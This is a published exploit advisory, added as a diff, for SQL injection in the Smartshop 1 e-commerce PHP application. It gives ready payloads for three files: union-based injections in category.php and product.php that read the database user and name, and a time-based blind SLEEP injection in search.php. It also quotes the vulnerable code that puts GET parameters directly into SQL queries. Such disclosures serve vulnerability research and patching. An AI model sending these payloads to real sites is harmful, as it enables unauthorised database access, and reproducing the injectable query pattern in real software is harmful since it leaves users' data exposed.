@@ -1,0 +1,60 @@
+# Exploit Title: Smartshop 1 - SQL Injection
+# Date: 2018-06-02
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Software Link: https://github.com/smakosh/Smartshop/archive/master.zip
+# Vendor Homepage: https://www.behance.net/gallery/49080415/Smartshop-Free-e-commerce-website
+# Version: 1
+# Tested on: Kali linux
+=================================================
+# Description :
+Smartshop 1 suffers from sql injection which attacker can inject sql
+commands .
+=================================================
+# POC : SQLi
+
+# vulnerable files : [ category.php  , product.php , search.php ]
+
+1) category.php :
+# Parameter : id
+# Type : Union based
+# Payload : ' UNION SELECT 1,user(),3,4,5%23
+
+# Vulnerable code :
+
+$id_category =$_GET['id'];
+$start = ($page > 1) ? ($page * $perpage) - $perpage : 0;
+$queryproduct = "SELECT SQL_CALC_FOUND_ROWS id, name, price, id_picture,
+thumbnail FROM product WHERE id_category = '{$id_category}' ORDER BY id
+DESC LIMIT {$start}, 16";
+$result = $connection->query($queryproduct);
+
+=================================================
+
+2) product.php :
+# Parameter : id
+# Type : Union based
+# Payload : ' UNION SELECT 1,user(),database(),4,5,6%23
+
+# Vulnerable code :
+
+$id_product =$_GET['id'];
+$queryproduct = "SELECT id, name, price, description, id_picture, thumbnail
+ FROM product WHERE id = '{$id_product}'";
+$result1 = $connection->query($queryproduct);
+
+=================================================
+
+3) search.php :
+# Parameter : searched
+# Type : Time-based blind
+# Payload : ' AND SLEEP(10)%23
+
+# Vulnerable code :
+
+$word = $_GET['searched'];
+$queryproduct = "SELECT SQL_CALC_FOUND_ROWS id, name, price, id_picture,
+thumbnail FROM product WHERE name LIKE '%{$word}%' ORDER BY id DESC LIMIT
+{$start}, 16";
+$result = $connection->query($queryproduct);
+
+=================================================
